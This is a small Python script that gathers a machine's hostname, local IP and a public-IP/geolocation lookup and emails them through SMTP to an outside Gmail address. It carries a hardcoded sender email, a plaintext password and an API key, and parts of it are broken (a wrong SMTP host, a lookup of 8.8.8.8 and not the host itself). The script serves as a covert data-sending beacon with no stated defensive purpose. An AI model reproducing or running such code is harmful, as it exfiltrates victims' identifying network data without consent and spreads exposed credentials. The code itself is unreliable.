import smtplib as smtp
from getpass import getpass
import socket
from requests import get

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('https://geo.ipify.org/api/v2/country?apiKey=at_G7qIijjDfQoKBGMi7tP2CEHidA39V&ipAddress=8.8.8.8').text



email = 'kirillshat15051900@gmail.com'
password = 'AYEloxmamkin228'

dest_email = 'artemlobsov372@gmail.com'
subject = 'IP'
email_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')

message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)

server = smtp.SMTP_SSL('smtp.google.com')
server.set_debuglevel(1)
server.ehlo(email)
server.login(email, password)
server.auth_plain()
server.sendmail(email, dest_email, message)
server.quit()
